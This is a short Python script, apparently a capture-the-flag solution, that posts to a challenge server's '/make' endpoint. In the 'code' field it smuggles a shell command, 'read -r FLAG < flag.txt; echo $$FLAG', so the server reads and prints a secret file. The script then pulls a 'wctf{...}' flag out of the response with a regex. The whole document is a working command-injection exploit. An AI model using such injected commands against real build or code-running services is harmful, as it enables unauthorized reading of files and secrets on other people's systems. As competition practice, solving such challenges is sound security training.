import requests
import re

data = {
    'name': 'readflag',
    'code': 'read -r FLAG < flag.txt; echo $$FLAG'
}

response = requests.post('https://madefunctional-okntin33tq-ul.a.run.app/make', data=data)
flag = re.findall(r'wctf{.*}', response.text)

print(flag)